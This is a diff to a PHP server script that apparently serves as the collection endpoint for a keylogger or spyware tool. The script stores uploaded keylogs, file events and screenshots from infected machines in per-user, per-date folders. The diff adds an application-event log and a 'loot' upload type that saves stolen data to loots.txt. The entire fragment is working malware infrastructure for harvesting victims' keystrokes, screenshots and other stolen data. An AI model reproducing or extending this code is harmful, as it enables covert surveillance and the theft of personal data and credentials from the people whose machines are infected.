@@ -52,6 +52,8 @@ $date = date("Y-m-d");
 $userfolder = $date . "/" . FilterFilename($username);
 /// Check if the current date's folder exist. If not create it.
 CheckFolder($userfolder);
+
+$delimiter = "[!time: " . date("h:i:sa") . "!]" . PHP_EOL;
 /// Parse upload.
 switch($uploadtype){
     case "logs":
@@ -59,7 +61,7 @@ switch($uploadtype){
         $logs = $_REQUEST[$uploadtype];
         $logfile = $userfolder . "/keylogs.txt";
         $fh = fopen($logfile, 'a') or die("Can't create file");
-        fwrite($fh, "[!time: " . date("h:i:sa") . "!]");
+        fwrite($fh, $delimiter);
         fwrite($fh, $logs);
     break;
     case "fileevent":
@@ -67,7 +69,23 @@ switch($uploadtype){
         $logs = $_REQUEST[$uploadtype];
         $logfile = $userfolder . "/fileevents.txt";
         $fh = fopen($logfile, 'a') or die("Can't create file");
-        fwrite($fh, "[!time: " . date("h:i:sa") . "!]");
+        fwrite($fh, $delimiter);
+        fwrite($fh, $logs);
+    break;
+    case "applicationevent":
+        /// Get sent logs.
+        $logs = $_REQUEST[$uploadtype];
+        $logfile = $userfolder . "/applicationevents.txt";
+        $fh = fopen($logfile, 'a') or die("Can't create file");
+        fwrite($fh, $delimiter);
+        fwrite($fh, $logs);
+    break;
+    case "loot":
+        /// Get sent logs.
+        $logs = $_REQUEST[$uploadtype];
+        $logfile = $userfolder . "/loots.txt";
+        $fh = fopen($logfile, 'a') or die("Can't create file");
+        fwrite($fh, $delimiter);
         fwrite($fh, $logs);
     break;
     case "screenshot":
@@ -77,7 +95,7 @@ switch($uploadtype){
         $filefromtemp = $_FILES["file"]["tmp_name"];
         move_uploaded_file($filefromtemp, $screenshotfile);
         break;
-     case "update":
+    case "update":
         header("Content-Type: text/plain");
         // show update.json
         readfile("Update.json");
